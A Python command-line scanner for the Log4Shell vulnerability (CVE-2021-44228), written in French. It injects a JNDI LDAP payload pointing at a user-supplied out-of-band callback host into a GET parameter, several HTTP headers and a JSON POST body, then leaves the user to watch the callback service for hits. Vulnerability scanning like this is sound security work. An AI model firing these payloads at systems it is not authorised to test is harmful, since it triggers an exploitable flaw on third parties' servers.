# -*- coding: utf-8 -*-
# Auteur: ozGod

import argparse
import requests
import sys
from urllib.parse import urlparse

def display_banner():
    """Affiche une bannière stylisée pour l'outil."""
    VERSION = "1.0.0"
    AUTHOR = "ozGod"
    banner = f"""
╔══════════════════════════════════════════════════════════╗
║                                                              ║
║  🐞 Détecteur-Log4Shell v{VERSION}                           ║
║                                                              ║
║  Scanner de vulnérabilité Log4Shell (CVE-2021-44228).       ║
║  Créé par {AUTHOR}                                           ║
║                                                              ║
╚══════════════════════════════════════════════════════════╝
"""
    print(banner)

# Liste des en-têtes HTTP couramment vulnérables
HEADERS_TO_TEST = [
    'User-Agent',
    'Referer',
    'X-Forwarded-For',
    'X-Api-Version',
    'X-Csrf-Token',
    'Authorization',
    'Cookie'
]

def generate_payload(callback_url):
    """Génère le payload JNDI avec l'URL de callback."""
    # Nettoie l'URL de callback pour l'injection
    parsed_url = urlparse(callback_url)
    clean_callback = parsed_url.netloc or parsed_url.path
    return f"${{jndi:ldap://{clean_callback}/a}}"

def scan_url(target_url, payload):
    """Envoie des requêtes à l'URL cible avec le payload dans différents points d'injection."""
    print(f"[*] Test de l'URL : {target_url}")
    
    # Test 1: Dans les paramètres GET
    try:
        print("  - Test des paramètres GET...")
        requests.get(target_url, params={"param": payload}, timeout=5, verify=False)
    except requests.RequestException as e:
        print(f"    [!] Erreur de connexion : {e}", file=sys.stderr)

    # Test 2: Dans les en-têtes HTTP
    print("  - Test des en-têtes HTTP...")
    for header in HEADERS_TO_TEST:
        headers = {header: payload}
        try:
            requests.get(target_url, headers=headers, timeout=5, verify=False)
        except requests.RequestException:
            continue # On ignore les erreurs de connexion ici

    # Test 3: Dans le corps d'une requête POST (JSON)
    print("  - Test du corps POST (JSON)...")
    try:
        requests.post(target_url, json={"data": payload}, timeout=5, verify=False)
    except requests.RequestException as e:
        print(f"    [!] Erreur de connexion : {e}", file=sys.stderr)

def main():
    display_banner()
    parser = argparse.ArgumentParser(
        description="Un scanner simple pour la vulnérabilité Log4Shell.",
        epilog="Utilise un service de callback externe (ex: interact.sh) pour détecter les interactions."
    )
    parser.add_argument("-u", "--url", required=True, help="L'URL cible à tester.")
    parser.add_argument("-c", "--callback", required=True, help="L'URL de callback unique (ex: xxxxx.oast.fun). L'outil ne détecte pas l'interaction, il faut la surveiller manuellement.")

    args = parser.parse_args()

    # Validation de l'URL de callback
    if not urlparse(args.callback).netloc:
        print("[!] Erreur: L'URL de callback semble invalide. Fournissez un domaine (ex: xxxxx.oast.fun).", file=sys.stderr)
        sys.exit(1)

    payload = generate_payload(args.callback)
    print(f"\n[*] Payload généré : {payload}")
    print(f"[*] URL de callback : {args.callback}\n")

    scan_url(args.url, payload)

    print("\n[*] Scan terminé.")
    print(f"[!] IMPORTANT: Veuillez vérifier votre service de callback ({args.callback}) pour toute interaction DNS ou HTTP.")
    print("    Si une interaction est détectée, le site est probablement vulnérable.")

if __name__ == "__main__":
    main()
